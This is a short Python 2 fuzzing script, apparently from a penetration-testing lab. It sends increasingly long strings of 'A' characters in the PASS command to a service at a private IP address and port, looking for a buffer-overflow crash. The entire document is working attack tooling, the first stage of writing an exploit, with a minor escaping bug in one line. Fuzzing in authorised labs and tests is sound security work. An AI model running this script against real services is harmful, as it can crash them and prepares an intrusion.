#!/usr/bin/python
import socket

buffer=["A"]
counter=10000
while len(buffer) <=30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.4.94', 49368))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('pass ' + string + 'r\n')
	s.send('QUIT\r\n')
	s.close()
